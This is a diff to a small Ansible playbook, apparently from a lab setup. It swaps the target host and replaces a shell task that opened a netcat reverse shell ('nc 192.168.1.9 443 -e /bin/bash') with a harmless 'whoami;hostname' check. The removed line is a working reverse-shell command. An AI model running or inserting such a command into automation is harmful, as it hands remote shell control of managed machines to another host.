@@ -1,10 +1,10 @@
 ---
   - name: "Lets play"
-    hosts: 192.168.1.8
+    hosts: 192.168.1.5
     tasks:
 
     - name: "Execute Comamand on node"
-      shell: "nc 192.168.1.9 443 -e /bin/bash"
+      shell: "whoami;hostname"
       register: "output"
 
     - debug: var=output.stdout_lines
